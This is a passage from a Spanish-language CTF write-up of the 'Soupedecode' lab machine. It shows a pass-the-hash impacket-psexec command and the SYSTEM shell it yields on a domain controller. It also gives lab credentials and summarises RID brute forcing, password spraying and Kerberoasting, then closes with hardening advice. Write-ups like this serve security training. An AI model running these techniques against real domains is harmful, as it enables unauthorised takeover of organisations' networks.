+<h3><strong>Ejecución remota con PsExec — Shell como SYSTEM</strong></h3>
+<p>Con privilegios administrativos, utilizamos <code>impacket-psexec</code> para ejecutar comandos en el DC usando el hash NTLM directamente (sin necesidad de contraseña).</p>
+<pre><code class="language-bash">                                                                  
+┌──(zikuta㉿zikuta)-[/usr/share/doc/python3-impacket/examples]
+└─$ impacket-psexec -hashes ":e41da7e79a4c76dbd9cf79d1cb325559" SOUPEDECODE.LOCAL/'Fileserver$'@10.201.99.61
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.201.99.61.....
+[*] Found writable share ADMIN$
+[*] Uploading file vzlxMxBf.exe
+[*] Opening SVCManager on 10.201.99.61.....
+[*] Creating service UdTF on 10.201.99.61.....
+[*] Starting service UdTF.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.587]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt; cd C:\Users\Administrator\Desktop
+ 
+C:\Users\Administrator\Desktop&gt; type root.txt
+______________
+</code></pre>
+<p>Se obtuvo una <strong>shell remota con permisos SYSTEM</strong>:</p>
+<p><strong>Dominio comprometido con éxito!</strong></p>
+<p>El hash de una cuenta de equipo fue suficiente para escalar privilegios al máximo nivel y obtener la <strong>flag final (<code>root.txt</code>)</strong>.</p>
+<h1>Tecnicas utilizadas</h1>
+<table>
+<thead>
+<tr>
+<th>Técnica</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>RID Brute Forcing</strong></td>
+<td>Enumeración de cuentas del dominio vía RID  usando SMB</td>
+</tr>
+<tr>
+<td><strong>Password Spraying</strong></td>
+<td>Ataque de autenticación masiva con contraseña débil (usuario=contraseña)</td>
+</tr>
+<tr>
+<td><strong>Kerberoasting</strong></td>
+<td>Solicitud de tickets TGS de cuentas con SPN y crackeo offline de sus hashes</td>
+</tr>
+<tr>
+<td><strong>Pass-the-Hash</strong></td>
+<td>Autenticación directa utilizando hashes NTLM sin conocer la contraseña</td>
+</tr>
+<tr>
+<td><strong>Remote Code Execution (RCE)</strong></td>
+<td>Ejecución remota como SYSTEM mediante PsExec (SMB + servicio)</td>
+</tr>
+</tbody>
+</table>
+<h2>Conclusión General</h2>
+<p>El compromiso de la máquina <strong>Soupedecode</strong> demuestra con claridad cómo una cadena de errores comunes en entornos de Active Directory puede escalar desde un acceso básico hasta el <strong>control total del dominio</strong>.</p>
+<p>Todo comenzó con un sencillo ataque de <strong>RID Brute Forcing</strong> y un <strong>password spraying</strong> básico que permitió obtener un usuario válido (<code>ybob317:ybob317</code>). Con esta cuenta, ejecutamos un ataque <strong>Kerberoasting</strong> que reveló múltiples hashes TGS de cuentas de servicio mal protegidas. Uno de estos hashes fue crackeado rápidamente debido al uso de una contraseña débil (<code>Password123!!</code>).</p>
+<p>A partir de ahí, accedimos a recursos compartidos SMB donde, sorprendentemente, encontramos expuestos <strong>hashes NTLM de cuentas de equipo</strong>. Estos hashes permitieron llevar a cabo un <strong>Pass-the-Hash</strong> para autenticar como <code>FileServer$</code>, una cuenta de equipo que poseía <strong>privilegios de administrador local sobre el DC</strong>.</p>
+<p>Con esto, el uso de <strong>impacket-psexec</strong> nos dio acceso interactivo como <strong>NT AUTHORITY\SYSTEM</strong>, lo que nos permitió capturar la <strong>flag de root</strong> y confirmar el compromiso total de la infraestructura.</p>
+<p>Este escenario reproduce un ataque realista donde un atacante interno o con acceso limitado puede escalar a un nivel crítico mediante técnicas bien conocidas, aprovechando <strong>mala gestión de credenciales</strong>, <strong>permisos excesivos</strong>, y <strong>falta de segmentación y control de acceso</strong>.</p>
+<h2>Recomendaciones de Seguridad</h2>
+<p>Para prevenir este tipo de compromisos en entornos reales, es fundamental aplicar múltiples capas de defensa y controles adecuados en todos los niveles del dominio:</p>
+<h3>Gestión de Credenciales</h3>
+<ul>
+<li><strong>Forzar el uso de contraseñas seguras</strong> mediante políticas de complejidad y rotación.</li>
+<li><strong>Auditar cuentas de servicio</strong> regularmente, ya que suelen quedar olvidadas y mal gestionadas.</li>
+<li>Proteger los hashes mediante el uso de <strong>LSA Protection (RunAsPPL)</strong> y <strong>Credential Guard</strong>.</li>
+</ul>
+<h3>Hardening de Active Directory</h3>
+<ul>
+<li><strong>Eliminar SPNs innecesarios</strong> y usar cuentas gMSA (Group Managed Service Accounts) siempre que sea posible.</li>
+<li>Evitar que <strong>cuentas de máquina tengan privilegios de administrador</strong> en el DC salvo que sea estrictamente necesario.</li>
+</ul>
+<h3>Seguridad en Recursos Compartidos</h3>
+<ul>
+<li><strong>Evitar exponer información sensible o hashes</strong> en archivos dentro de recursos SMB.</li>
+<li>Aplicar <strong>revisión periódica de permisos</strong> en comparticiones de red.</li>
+</ul>
+<h3>Autenticación y Acceso</h3>
+<ul>
+<li>Implementar <strong>autenticación multifactor (MFA)</strong> para acceso administrativo.</li>
+<li><strong>Segmentar redes</strong> para evitar que cualquier usuario pueda contactar directamente al controlador de dominio.</li>
+</ul>
+<h3>Detección y Respuesta</h3>
+<ul>
+<li>Activar <strong>auditoría avanzada de eventos</strong> para detectar actividades sospechosas como solicitudes de TGS masivas o intentos de conexión desde cuentas de máquina.</li>
+<li>Utilizar herramientas como <strong>Sysmon</strong>, <strong>ELK stack</strong>, <strong>Splunk</strong> o <strong>Microsoft Defender for Identity</strong> para correlación de eventos y alertas.</li>
+</ul>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
